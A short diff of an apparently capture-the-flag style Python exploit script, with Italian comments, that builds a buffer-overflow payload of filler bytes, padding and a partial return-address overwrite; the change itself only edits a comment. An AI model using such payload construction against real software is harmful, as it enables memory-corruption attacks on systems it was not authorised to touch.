@@ -19,7 +19,7 @@ payload = b'A' * buffer_size   # Riempie il buffe         # Sovrascrive `n` con 
 payload += b'\x57' * padding_size # Padding fino alla return address
 payload += return_address_overwrite  # Modifica gli ultimi 2 byte della return address
 
-# Debug: stampa la dimensione del payload
+# Stampa la dimensione del payload
 print(f"Payload size: {len(payload)}")  # Per debuggingq
 
 #while True:
